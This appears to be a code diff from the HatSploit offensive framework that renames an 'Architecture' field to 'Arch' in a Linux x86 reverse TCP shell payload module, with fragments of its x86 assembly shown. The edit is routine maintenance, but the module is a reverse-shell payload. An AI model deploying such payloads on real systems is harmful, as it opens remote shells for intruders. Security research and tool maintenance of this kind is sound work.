@@ -19,7 +19,7 @@ class HatSploitPayload(Payload, Handler, Assembler, Socket):
                 'Ivan Nikolsky (enty8080) - payload developer',
             ],
             'Description': "Shell reverse TCP payload for Linux x86.",
-            'Architecture': "x86",
+            'Arch': "x86",
             'Platform': "linux",
             'Rank': "high",
             'Type': "reverse_tcp",
@@ -27,7 +27,7 @@ class HatSploitPayload(Payload, Handler, Assembler, Socket):
 
     def implant(self):
         return self.assemble(
-            self.details['Architecture'],
+            self.details['Arch'],
             """
                 push edi
                 pop ebx
@@ -54,7 +54,7 @@ class HatSploitPayload(Payload, Handler, Assembler, Socket):
 
     def run(self):
         return self.assemble(
-            self.details['Architecture'],
+            self.details['Arch'],
             f"""
             start:
                 xor ebx, ebx
